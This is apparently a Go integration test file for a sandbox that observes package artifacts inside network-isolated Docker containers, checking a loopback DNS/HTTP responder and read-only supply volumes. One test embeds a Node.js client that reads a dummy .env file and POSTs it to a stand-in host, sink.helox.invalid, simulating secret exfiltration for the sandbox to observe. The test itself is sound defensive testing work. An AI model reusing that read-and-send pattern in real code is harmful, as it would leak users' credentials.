//go:build linux && realcorpus

package sandbox

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"github.com/rahoney/heliopause/internal/core/domain"
	"github.com/rahoney/heliopause/internal/hosttool"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"
)

// Exercise the production protected current-version reader without starting
// an artifact, Docker or a helper. The caller owns an explicit CI fixture.
func TestCIResponderSourceIntegration(t *testing.T) {
	if os.Getenv("HELOX_CI_RESPONDER_SOURCE_INTEGRATION") != "1" {
		t.Skip("requires declared protected CI source fixture")
	}
	if os.Geteuid() == 0 {
		t.Fatal("requires ordinary-user protected source reader")
	}
	expected := os.Getenv("HELOX_CI_RESPONDER_EXPECT")
	if expected != "ready" && expected != "unavailable" {
		t.Fatal("declare exact source expectation")
	}
	err := CheckResponderSource(context.Background())
	if (err == nil) != (expected == "ready") {
		t.Fatal("protected source expectation differs", err)
	}
	t.Logf("ci_responder_source expected=%s available=%t scope=SOURCE_DATA_ONLY", expected, err == nil)
}

// Literal-address, bounded DNS-wire and HTTP DATA only. The existing Python
// Artifact lane supplies isolation/accounting; no trusted responder role is proven.
func TestLoopbackResponderDATAIntegration(t *testing.T) {
	if os.Getenv("HELOX_RESPONDER_PRIMITIVE") != "1" {
		t.Skip("explicit pinned guest loopback DATA primitive")
	}
	const program = `import socket
ip = '127.0.0.1'
query = bytes.fromhex('123401000001000000000000') + b'\x08artifact\x05helox\x07invalid\x00\x00\x01\x00\x01'
answer = bytes.fromhex('123481800001000100000000') + query[12:] + bytes.fromhex('c00c000100010000000100047f000001')
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server, socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
    server.settimeout(1); client.settimeout(1)
    server.bind((ip, 0)); client.bind((ip, 0))
    assert client.sendto(query, server.getsockname()) == len(query)
    data, peer = server.recvfrom(512)
    assert data == query
    assert server.sendto(answer, peer) == len(answer)
    response = client.recv(512)
    assert response == answer
    resolved = socket.inet_ntoa(response[-4:])
    assert resolved == ip
request = b'GET /probe HTTP/1.0\r\n\r\n'
reply = b'HTTP/1.0 200 OK\r\nContent-Length: 2\r\n\r\nok'
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server, socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
    server.settimeout(1); client.settimeout(1)
    server.bind((ip, 0)); server.listen(1)
    client.connect((resolved, server.getsockname()[1]))
    connection, _ = server.accept()
    with connection:
        connection.settimeout(1)
        client.sendall(request)
        received = b''
        while len(received) < len(request):
            part = connection.recv(len(request) - len(received))
            assert part
            received += part
        assert received == request
        connection.sendall(reply)
    received = b''
    while len(received) < len(reply):
        part = client.recv(len(reply) - len(received))
        assert part
        received += part
    assert received == reply
`
	result := runLinuxPyPIWheelIntegration(t, linuxDynamicWheelWithProgram(t, program))
	connections := uint64(0)
	for _, fact := range result.Observations() {
		if fact.Subject() == "network-attempt" {
			connections += fact.Count()
		}
	}
	states := result.EnvironmentStates()
	if connections < 2 || len(states) != 2 || !states[0].VFSOperationsCovered || !states[1].VFSOperationsCovered {
		t.Fatal("two isolated DATA exchanges were not observed")
	}
	t.Logf("literal-address Python fixture: loopback DNS-wire-to-HTTP in two network-none environments; observed connections=%d; no default resolver, trusted responder role or Policy claim", connections)
}

// This exercises the actual held-source reader and never-started Docker DATA
// supply. It grants no gVisor process-role or complete S02 qualification.
func TestResponderSupplyDATAIntegration(t *testing.T) {
	if os.Getenv("HELOX_RESPONDER_SUPPLY_DATA") != "1" {
		t.Skip("explicit responder immutable supply DATA")
	}
	if os.Geteuid() != 0 {
		t.Fatal("Root-owned disposable source fixture required")
	}
	body, err := os.ReadFile(os.Getenv("HELOX_RESPONDER_SUPPLY_SOURCE"))
	if err != nil || !validResponderImage(body) {
		t.Fatal("qualified fixed static source unavailable", err)
	}
	root := t.TempDir()
	must := func(err error) {
		t.Helper()
		if err != nil {
			t.Fatal(err)
		}
	}
	must(os.Chmod(root, 0755))
	must(os.Mkdir(filepath.Join(root, "versions"), 0755))
	target := filepath.Join(root, "versions", "v1.0.0-s02-data")
	must(os.Mkdir(target, 0755))
	must(os.WriteFile(filepath.Join(target, responderToolName), body, 0555))
	must(os.Symlink("versions/v1.0.0-s02-data", filepath.Join(root, "current")))
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	executor, err := hosttool.NewSystem(ctx)
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if err := executor.Close(); err != nil {
			t.Error(err)
		}
	}()
	supply, err := prepareResponderSupply(ctx, executor, root)
	if err != nil {
		t.Fatal("fixed source/never-started DATA failed", err)
	}
	closed := false
	defer func() {
		if !closed {
			cleanup, cancel := resolverCleanupContext()
			defer cancel()
			if err := supply.close(cleanup, executor); err != nil {
				t.Error(err)
			}
		}
	}()
	digest := sha256.Sum256(body)
	if supply.digest != hex.EncodeToString(digest[:]) {
		t.Fatal("source digest changed")
	}
	mount, err := supply.mountArgument()
	if err != nil || mount != "type=volume,source="+supply.name+",target="+responderGuestRoot+",volume-nocopy,readonly" {
		t.Fatal("readonly supply unavailable", err)
	}
	// A never-started readonly consumer checks real mount semantics and held
	// DATA identity; a live attachment must prevent premature supply deletion.
	created, err := executor.Output(ctx, "docker", "create", "--pull", "never", "--name", supply.name+"-reader",
		"--label", responderSupplyLabel+"="+supply.owner, "--network", "none", "--read-only", "--user", "0:0", "--cap-drop", "ALL",
		"--security-opt", "no-new-privileges", "--mount", mount, nodeImageReference)
	id := strings.TrimSpace(string(created))
	if err != nil || !exactObservationContainerID(id) {
		t.Fatal("readonly consumer preparation", err)
	}
	remove := func() error {
		state, err := executor.Output(ctx, "docker", "inspect", "--format", `{{.Id}}|{{.Config.Image}}|{{index .Config.Labels "io.heliopause.responder-supply"}}|{{.State.Status}}|{{.State.Running}}|{{.State.Pid}}|{{range .Mounts}}{{if eq .Destination "/haa-responder"}}{{.Name}}|{{.Source}}|{{.RW}}{{end}}{{end}}`, id)
		expected := id + "|" + nodeImageReference + "|" + supply.owner + "|created|false|0|" + supply.name + "|" + supply.mountpoint + "|false"
		if err != nil || strings.TrimSpace(string(state)) != expected {
			return fmt.Errorf("readonly consumer identity unproven: %w", errResponderSupply)
		}
		_, err = executor.Output(ctx, "docker", "rm", id)
		return err
	}
	removed := false
	defer func() {
		if !removed {
			if err := remove(); err != nil {
				t.Error(err)
			}
		}
	}()
	readback, err := readNativeToolFromContainer(ctx, executor, id, responderGuestPath, nativeToolFileIdentity{int64(len(body)), supply.digest, 0555}, nativeRuntimeResponder)
	if err != nil || len(readback) != len(body) {
		t.Fatal("readonly consumer DATA identity", err)
	}
	if supply.close(ctx, executor) == nil {
		t.Fatal("attached supply was deleted")
	}
	must(remove())
	removed = true
	// Preparation/reader have both been drained and removed.
	must(supply.close(ctx, executor))
	closed = true
	t.Log("protected current component, pinned compiler/static metadata, exact root-owned tar readback, stager absence and supply removal confirmed; no Artifact execution")
}

// Small real-role prerequisite and inert DATA client. No acquired artifact or
// Policy/complete stimulus experiment is qualified by this test.
func TestResponderRoleDATAIntegration(t *testing.T) {
	if os.Getenv("HELOX_RESPONDER_ROLE_DATA") != "1" {
		t.Skip("explicit pinned responder OCI role prerequisite")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 45*time.Second)
	defer cancel()
	executor, err := hosttool.NewSystem(ctx)
	if err != nil {
		t.Fatal(err)
	}
	defer executor.Close()
	runner := admissionAwareRunner(executor)
	supply, err := prepareResponderSupply(ctx, runner, os.Getenv("HELOX_RESPONDER_SOURCE_INSTALLATION"))
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		cleanup, done := resolverCleanupContext()
		defer done()
		if err := supply.close(cleanup, runner); err != nil {
			t.Error(err)
		}
	}()
	supervisor := integrationObserverSupervisor(t)
	supervisor.SetDiagnosticWriter(os.Stderr)
	defer func() {
		if err := supervisor.Close(); err != nil {
			t.Error(err)
		}
	}()
	observer, ok := supervisor.Observer().(*SharedObserver)
	if !ok {
		t.Fatal("shared observer unavailable")
	}
	owner, err := domain.NewSandboxSessionID()
	if err != nil {
		t.Fatal(err)
	}
	resources := integrationObservationResourceAdapter(t)
	lease, err := resources.Create(ctx, owner.String(), "npm-lifecycle")
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		cleanup, done := resolverCleanupContext()
		defer done()
		if _, err := resources.Close(cleanup, owner.String()); err != nil {
			t.Error(err)
		}
	}()
	args := createArguments(owner)
	image := slices.Index(args, nodeImageReference)
	mount, err := supply.mountArgument()
	if err != nil || image < 0 {
		t.Fatal(err)
	}
	extra := []string{"--interactive", "--mount", mount, "--dns", "127.0.0.1", "--dns-search", ".",
		"--dns-opt", "ndots:0", "--dns-opt", "timeout:1", "--dns-opt", "attempts:1",
		"--cpuset-cpus", strconv.Itoa(lease.CPU), "--cgroup-parent", lease.CgroupParent,
		"--label", closureVolumeLabel + "=" + owner.String(), "--label", closureManifestLabel + "=" + supply.digest,
		"--label", "io.heliopause.observation-phase=observation"}
	args = append(append(append([]string{}, args[:image]...), extra...), args[image:]...)
	args[len(args)-1] = responderContainerCommand()
	created, err := runner.Output(ctx, "docker", args...)
	id := strings.TrimSpace(string(created))
	if err != nil || !exactObservationContainerID(id) {
		t.Fatal("create responder init", err)
	}
	runtime := &pythonPhaseRuntime{id: id, phase: phaseObservation}
	var controller *inspectionResponder
	terminated := false
	defer func() {
		if !terminated {
			cleanup, done := resolverCleanupContext()
			defer done()
			if runtime.registered {
				_, trace, err := runtime.stopAndCollect(resources, owner.String())
				t.Logf("responder first trace: %s", trace.diagnostic.String())
				if err != nil {
					t.Error(err)
				}
			} else {
				actual, err := runner.Output(cleanup, "docker", "inspect", "--format", `{{.Id}}|{{.Config.Image}}|{{index .Config.Labels "io.heliopause.observation-transaction"}}`, id)
				if err != nil || strings.TrimSpace(string(actual)) != id+"|"+nodeImageReference+"|"+owner.String() {
					t.Error("unconfirmed responder identity", err)
					return
				}
				if _, err = runner.Output(cleanup, "docker", "rm", "--force", id); err != nil {
					t.Error(err)
				}
				if runtime.trace != nil {
					runtime.collect()
				}
			}
			if controller != nil {
				controller.cancel()
				_ = controller.input.Close()
			}
		}
	}()
	if err := supply.verifyReader(ctx, runner, id); err != nil {
		t.Fatal(err)
	}
	topology, known := observerExpectedTopology("npm-lifecycle")
	if !known {
		t.Fatal("profile unavailable")
	}
	topology, err = supply.expectedTopology(topology)
	if err != nil {
		t.Fatal(err)
	}
	budget, err := newObservationTraceLedger("npm-lifecycle")
	if err != nil {
		t.Fatal(err)
	}
	runtime.trace, err = observer.startProfileWithBudget(ctx, id, "npm-lifecycle", topology, budget)
	if err != nil {
		t.Fatal(err)
	}
	controller, err = startResponderInit(ctx, runner, id)
	if err != nil {
		t.Fatal("responder start", err)
	}
	registered, err := resources.Register(ctx, owner.String(), id, string(phaseObservation))
	if err != nil || registered.CgroupParent != lease.CgroupParent {
		t.Fatal("register responder resource", err)
	}
	runtime.registered = true
	if err := observer.AwaitMountAnchors(ctx, id); err != nil {
		t.Fatal(err)
	}
	if err := awaitBoundaryHelper(ctx, runner, id, true); err != nil {
		t.Fatal("separate init/Artifact credential readiness", err)
	}
	if err := verifyEnvironmentResolver(ctx, runner, id); err != nil {
		t.Fatal("fixed resolver DATA attestation", err)
	}
	// The fixed Node executable is an ARTIFACT-role client here. Readiness or
	// its exit code cannot substitute for the independent drain below.
	const client = `const fs=require('node:fs'),http=require('node:http');
fs.mkdirSync('/tmp/project',{recursive:true});fs.writeFileSync('/tmp/project/.env','HAA_INVALID_DUMMY\n');
const req=http.get('http://probe.helox.invalid/probe',r=>{r.resume();r.on('end',()=>{
if(r.statusCode!==200){process.exitCode=2;return;}
const body=fs.readFileSync('/tmp/project/.env');
const sink=http.request({hostname:'sink.helox.invalid',path:'/sink',method:'POST',headers:{'Content-Length':body.length}},s=>{
s.resume();s.on('end',()=>{if(s.statusCode!==204)process.exitCode=3;});});
sink.on('error',()=>{process.exitCode=4;});sink.end(body);
});});req.on('error',()=>{process.exitCode=5;});`
	if err := discardCommand(ctx, runner, "docker", boundaryExecArguments(id, boundaryLaunchMode,
		"/bin/sh", "-ceu", `"$@"; :`, "haa-data-client", boundaryHelperPath, "-c",
		"exec /usr/local/bin/node -e '"+strings.ReplaceAll(client, "'", "'\"'\"'")+"'")...); err != nil {
		t.Fatal("synthetic DNS/HTTP DATA client", err)
	}
	cleanup, done := context.WithTimeout(context.Background(), 7*time.Second)
	defer done()
	if err := controller.stop(cleanup); err != nil {
		t.Fatal("bounded protocol stop", err)
	}
	final, trace, err := runtime.stopAndCollect(resources, owner.String())
	terminated = err == nil
	if err != nil || trace.limitation != "" || !trace.diagnostic.SessionComplete || final.CgroupParent != lease.CgroupParent {
		t.Fatalf("role termination/drain: %v %s", err, trace.diagnostic.String())
	}
	if err := controller.waitAfterTermination(cleanup, true); err != nil {
		t.Fatal("init channel finalization", err)
	}
	t.Log("fixed readonly UID1001 init and UID1000 DATA client, synthetic DNS/HTTP/dummy sink, STOP prerequisite, independent resource termination and complete observer drain confirmed; no acquired Artifact/Policy qualification")
}
